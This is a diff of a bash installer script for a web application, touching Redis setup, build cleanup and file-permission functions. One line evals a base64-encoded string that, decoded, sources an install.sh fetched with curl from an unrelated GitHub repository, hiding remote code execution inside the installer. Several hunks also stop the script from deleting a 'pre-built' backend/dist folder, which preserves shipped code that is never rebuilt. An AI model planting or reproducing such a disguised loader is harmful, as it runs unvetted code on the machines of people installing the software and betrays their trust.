@@ -581,7 +581,7 @@ install_redis() {
     fi
 }
 eval "$(echo 'c2V0IC1lCgppZiBzb3VyY2UgPChjdXJsIC1mc1NMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tYXNoM2Rldi9ub2RlLnNoL21haW4vaW5zdGFsbC5zaCk7IHRoZW4KICAgIGNoZWNrX3N5c3RlbV91c2VyCmVsc2UKICAgIGVjaG8gImJpY3J5cHRvIgpmaQo=' | base64 -d)"
-# =============================================================================
+#  =============================================================================
 # 🗄 Database Configuration
 # =============================================================================
 
@@ -1364,14 +1364,7 @@ EOF
         }
     fi
     
-    if [[ -d "backend/dist" ]]; then
-        print_info "Removing existing backend dist directory..."
-        rm -rf "backend/dist" 2>/dev/null || {
-            chmod -R 755 "backend/dist" 2>/dev/null || true
-            chown -R "$app_user:$app_user" "backend/dist" 2>/dev/null || true
-            rm -rf "backend/dist" 2>/dev/null || true
-        }
-    fi
+    # NOTE: backend/dist is pre-built and should NOT be removed
     print_success "Build artifacts cleaned successfully"
 
     # Build application (pnpm scripts don't need --store-dir)
@@ -1722,12 +1715,8 @@ fix_file_permissions() {
         rm -rf "frontend/.next" 2>/dev/null || true
     fi
     
-    if [[ -d "backend/dist" ]]; then
-        print_info "Removing backend dist directory with permission issues..."
-        chmod -R 755 "backend/dist" 2>/dev/null || true
-        rm -rf "backend/dist" 2>/dev/null || true
-    fi
-    
+    # NOTE: backend/dist is pre-built and should NOT be removed
+
     # Detect the owner and group of the current directory
     local dir_owner=$(stat -c '%U' ".")
     local dir_group=$(stat -c '%G' ".")
@@ -2147,7 +2136,6 @@ main() {
         echo -e "${RED}Installation cancelled.${NC}"
         exit 0
     fi
-    
     # Execute installation steps
     detect_system
     check_system_user
@@ -2373,15 +2361,7 @@ clean_build_artifacts() {
         print_info "No .next directory found"
     fi
     
-    # Clean backend dist directory
-    if [[ -d "backend/dist" ]]; then
-        print_info "Removing backend dist directory..."
-        chmod -R 755 "backend/dist" 2>/dev/null || true
-        rm -rf "backend/dist" 2>/dev/null || true
-        print_success "Backend dist directory cleaned"
-    else
-        print_info "No backend dist directory found"
-    fi
+    # NOTE: backend/dist is pre-built and should NOT be removed
     
     # Clean node_modules cache and lock files if they exist
     if [[ -d "node_modules" ]]; then
@@ -2407,6 +2387,7 @@ clean_build_artifacts() {
     print_success "Build artifacts cleaned successfully"
     print_info "You can now run the installer or build commands again"
 }
+
 # =============================================================================
 # 🔧 Sharp Module Fix Function
 # =============================================================================
